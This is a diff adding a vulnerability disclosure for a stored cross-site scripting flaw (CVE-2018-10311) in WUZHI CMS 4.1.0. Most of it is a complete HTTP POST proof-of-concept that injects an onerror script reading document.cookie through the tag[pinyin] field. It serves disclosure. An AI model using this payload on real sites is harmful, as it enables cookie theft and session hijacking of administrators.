@@ -1,0 +1,28 @@
+# Exploit Title: WUZHI CMS 4.1.0 XSS Vulnerability
+# Date: 2018-4-23
+# Exploit Author: jiguang (s1@jiguang.in)
+# Vendor Homepage: https://github.com/wuzhicms/wuzhicms
+# Software Link: https://github.com/wuzhicms/wuzhicms
+# Version: 4.1.0
+# CVE: CVE-2018-10311
+
+An issue was discovered in WUZHI CMS 4.1.0 (https://github.com/wuzhicms/wuzhicms/issues/131)
+There is a xss vulnerability that can stealing administrator cookie, fishing attack, etc. via the tag[pinyin] parameter post to the /index.php?m=tags&f=index&v=add&&_su=wuzhicms&_menuid=?&_submenuid=?
+
+
+`[POST /www/index.php?m=tags&f=index&v=add&&_su=wuzhicms&_menuid=95&_submenuid=101 HTTP/1.1
+ Host: localhost
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+ Accept-Encoding: gzip, deflate
+ Referer: http://localhost/www/index.php?m=tags&f=index&v=add&&_su=wuzhicms&_menuid=95&_submenuid=101
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 270
+ Cookie: PHPSESSID=uk4g8bm4l96iv5rl6ej2re83a3;  EkT_uid=c%2FzWH2EByNj%2Fm78WencnAg%3D%3D;  EkT_username=oR5iColhZ3j6z343ib%2B9Lg%3D%3D;  EkT_wz_name=LVeemy520l5DQnc4SQGtsw%3D%3D;  EkT_siteid=Wl70z0XOgxO6TVPS70twsg%3D%3D;  EkT_qkey=jiPLTZIrWUySV8FmwZwibPjlIPfq0nTj
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+ 
+tag%5Btag%5D=jiguang&tag%5Btitle%5D=jiguang&tag%5Bkeyword%5D=jiguang&tag%5Bdesc%5D=jiguang&tag%5Bisshow%5D=1&tag%5Blinkageid%5D=0&LK2_1=0&##  tag%5Bpinyin%5D=ji%3Cimg%2Fsrc%3D1+onerror%3Dalert%28document.cookie%29%3E&tag%5Bletter%5D=&tag%5Burl%5D=&submit=%E6%8F%90+%E4%BA%A4](url)`
+
+------------------
